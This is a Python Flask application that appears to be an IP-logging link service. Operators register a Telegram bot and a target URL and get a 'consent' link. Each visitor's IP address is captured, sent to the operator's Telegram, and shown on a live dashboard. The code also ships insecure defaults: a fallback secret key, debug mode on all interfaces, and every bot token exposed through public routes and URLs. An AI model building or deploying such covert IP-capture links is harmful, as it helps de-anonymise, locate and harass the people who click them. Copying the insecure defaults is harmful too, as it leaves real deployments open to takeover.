import os
import json
import logging
from datetime import datetime
from flask import Flask, render_template, request, redirect, url_for, flash, jsonify, Response, send_from_directory
from bot_manager import get_bot_info, send_ip_notification
import queue
import threading

app = Flask(__name__)
app.secret_key = os.environ.get("SESSION_SECRET", "default-secret-key")
logging.basicConfig(level=logging.DEBUG)

# Ensure data directory exists
os.makedirs('data', exist_ok=True)

def load_data(filename):
    try:
        with open(f'data/{filename}.json', 'r') as f:
            return json.load(f)
    except FileNotFoundError:
        return {}

def save_data(filename, data):
    with open(f'data/{filename}.json', 'w') as f:
        json.dump(data, f, indent=4)

def increment_visit_counter(bot_token=None):
    visits = load_data('visits')
    today = datetime.now().strftime('%Y-%m-%d')

    if bot_token:
        if bot_token not in visits:
            visits[bot_token] = {}
        visits[bot_token][today] = visits[bot_token].get(today, 0) + 1
    else:
        if 'main' not in visits:
            visits['main'] = {}
        visits['main'][today] = visits['main'].get(today, 0) + 1

    save_data('visits', visits)
    return visits

def get_consent_url(bot_token):
    """Generate a unique URL for the bot's consent page"""
    return f"{request.host_url}consent/{bot_token}"

# Add these global variables after existing ones
ip_updates = queue.Queue()
connected_clients = []

@app.route('/data/rlinks.json')
def get_random_links():
    return send_from_directory('data', 'rlinks.json')

@app.route('/')
def index():
    visits = increment_visit_counter()
    total_visits = sum(visits.get('main', {}).values())
    bots = load_data('bots')
    return render_template('index.html', total_visits=total_visits, bots=bots)

@app.route('/submit', methods=['POST'])
def submit():
    bot_token = request.form.get('bot_token')
    telegram_id = request.form.get('telegram_id')
    url = request.form.get('url')

    if not all([bot_token, telegram_id, url]):
        flash('All fields are required', 'error')
        return redirect(url_for('index'))

    try:
        bot_info = get_bot_info(bot_token)
        if not bot_info:
            flash('Invalid bot token', 'error')
            return redirect(url_for('index'))

        bots = load_data('bots')
        consent_url = get_consent_url(bot_token)
        bots[bot_token] = {
            'telegram_id': telegram_id,
            'url': url,
            'info': bot_info,
            'created_at': datetime.now().isoformat(),
            'consent_url': consent_url,
            'approved_ips': []
        }
        save_data('bots', bots)

        return redirect(url_for('bot_info', token=bot_token))
    except Exception as e:
        logging.error(f"Error processing bot info: {str(e)}")
        flash('Error processing bot information', 'error')
        return redirect(url_for('index'))

@app.route('/bot/<token>')
def bot_info(token):
    bots = load_data('bots')
    if token not in bots:
        flash('Bot not found', 'error')
        return redirect(url_for('index'))

    visits = load_data('visits')
    total_visits = sum(visits.get(token, {}).values())

    return render_template('bot_info.html', bot=bots[token], total_visits=total_visits)

@app.route('/consent/<token>')
def consent_page(token):
    bots = load_data('bots')
    if token not in bots:
        flash('Invalid bot token', 'error')
        return redirect(url_for('index'))
    return render_template('consent.html', bot=bots[token], bot_token=token)

@app.route('/consent/<token>/visit', methods=['POST'])
def consent_visit(token):
    bots = load_data('bots')
    if token not in bots:
        return jsonify({'error': 'Invalid token'}), 404

    visitor_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    if ',' in visitor_ip:
        visitor_ip = visitor_ip.split(',')[0].strip()
    logging.info(f"New visit from IP: {visitor_ip} for bot: {token}")

    # Save IP if it's new
    if visitor_ip not in bots[token]['approved_ips']:
        bots[token]['approved_ips'].append(visitor_ip)
        save_data('bots', bots)

    # Always send notification for every visit
    send_ip_notification(
        token,
        bots[token]['telegram_id'],
        visitor_ip,
        bots[token]['url']
    )

    # Broadcast IP update to all connected dashboard clients
    ip_data = {
        'ip_address': visitor_ip,
        'bot_username': bots[token]['info']['username'],
        'target_url': bots[token]['url'],
        'timestamp': datetime.now().isoformat()
    }

    logging.info(f"Broadcasting IP update to {len(connected_clients)} clients: {ip_data}")
    for client_queue in connected_clients:
        client_queue.put(ip_data)

    # Always increment visit counter
    increment_visit_counter(token)

    return jsonify({'success': True})

@app.route('/guide')
def guide():
    return render_template('guide.html')

@app.route('/history')
def history():
    bots = load_data('bots')
    return render_template('history.html', bots=bots)

@app.route('/reset')
def reset():
    return redirect(url_for('index'))

@app.route('/api/visits')
def get_visits():
    visits = load_data('visits')
    return jsonify(visits.get('main', {}))

@app.route('/api/visits/<token>')
def get_bot_visits(token):
    visits = load_data('visits')
    return jsonify(visits.get(token, {}))

# Add these new routes before the main() block
@app.route('/dashboard')
def dashboard():
    return render_template('dashboard.html')

def format_sse(data: str, event=None) -> str:
    msg = f'data: {data}\n\n'
    if event is not None:
        msg = f'event: {event}\n{msg}'
    return msg

@app.route('/api/ip-stream')
def stream():
    def generate():
        client_queue = queue.Queue()
        client_id = id(client_queue)  # Уникальный идентификатор клиента
        connected_clients.append(client_queue)
        logging.info(f"New client connected (ID: {client_id}). Total clients: {len(connected_clients)}")

        try:
            while True:
                try:
                    data = client_queue.get()
                    logging.info(f"Sending data to client (ID: {client_id}): {data}")
                    yield format_sse(json.dumps(data))
                except Exception as e:
                    logging.error(f"Error sending data to client (ID: {client_id}): {str(e)}")
                    break
        finally:
            connected_clients.remove(client_queue)
            logging.info(f"Client disconnected (ID: {client_id}). Remaining clients: {len(connected_clients)}")

    return Response(generate(), mimetype='text/event-stream')

@app.route('/api/recent-ips')
def get_recent_ips():
    try:
        bots = load_data('bots')
        recent_ips = []
        for token, bot in bots.items():
            for ip in bot['approved_ips']:
                recent_ips.append({
                    'ip_address': ip,
                    'bot_username': bot['info']['username'],
                    'target_url': bot['url'],
                    'timestamp': datetime.now().isoformat()
                })
        logging.info(f"Returning {len(recent_ips)} recent IPs")
        return jsonify(recent_ips)
    except Exception as e:
        logging.error(f"Error getting recent IPs: {str(e)}")
        return jsonify({'error': str(e)}), 500


if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port, debug=True)